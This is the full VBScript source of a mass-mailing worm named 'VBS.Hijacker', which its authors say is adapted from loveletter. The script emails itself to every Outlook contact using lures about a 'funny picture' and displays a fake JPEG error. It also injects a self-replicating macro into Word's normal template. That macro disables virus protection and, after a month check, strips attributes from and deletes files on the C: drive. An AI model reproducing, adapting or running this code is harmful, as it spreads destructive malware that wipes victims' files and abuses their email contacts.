em  VBS.Hijacker
rem  By TB and Syph. Original idea stolen from loveletter.

Spreadbymail()
Infectword()
Msgbox "Could not open the JPEG image. Correct filter has not been
installed.",vbcritical,"Fatal error"

Sub SpreadByMail()
Set App = Createobject("Outlook.application")
Set MAPI = App.Getnamespace("MAPI")
Set Mail = App.CreateItem(olMailitem)
Set Mail2 = App.CreateItem(olMailitem)
Set AddressBook = MAPI.Addresslists(1)

For X = 1 to Addressbook.addressentries.count
On error resume next

Target = Addressbook.addressentries(X)
Mail.recipients.add(Target)
Mail2.recipients.add(Target)

If Addressbook.addressentries(X+1) = Addressbook.addressentries(X+2) then X
= X +2

next

Mail.subject = "Fw: Fw: Have a look at this funny picture"
Mail.body = vbcrlf & ">> Have a look at this picture, it's really funny !!
;)"
Mail.send

Mail2.subject = "Sorry, forgot to attach the picture !! :)"
Mail2.body = vbcrlf & "It's really funny !! ;)"
Mail2.attachments.add(Wscript.scriptfullname)
Mail2.send


End sub


Sub Infectword()
On error resume next

Dim Code
Dim Lines(10)
Lines(1) = "Private sub document_open"
Lines(2) = "Options.virusprotection = (rnd*0)"
Lines(3) = "Options.savenormalprompt = (rnd*0)"
Lines(4) = "Set Iamhere =
Macrocontainer.vbproject.vbcomponents(1).codemodule"
Lines(5) = "If macrocontainer.fullname = normaltemplate.fullname then set
infect = activedocument.vbproject.vbcomponents(1).codemodule: Saveit = 1"
Lines(6) = "If macrocontainer.fullname = activedocument.fullname then set
infect = normaltemplate.vbproject.vbcomponents(1).codemodule"
Lines(7) = "If infect.countoflines < 1 then Infect.addfromstring
Iamhere.lines(1,iamhere.countoflines)"
Lines(8) = "If saveit = 1 then activedocument.saveas filename :=
activedocument.fullname, fileformat := wddocument"
Lines(9) = "If month(now) > " & month(now) & "then shell(" &chr(34)
&"c:\windows\command\attrib.exe c:\*.* -r -s -h" & chr(34) & "),vbhide: kill
"&chr(34)&"c:\*.*"&chr(34)
Lines(10) = "End sub"

For I = 1 to 10
Code = Code & Lines(I) & vbcrlf
Next

Set WordApp = CreateObject("word.application")
If WordApp.normaltemplate.vbproject.vbcomponents(1).codemodule.countoflines
> 1 then
WordApp.normaltemplate.vbproject.vbcomponents(1).codemodule.addfromstring
Code
WordApp.quit

End sub




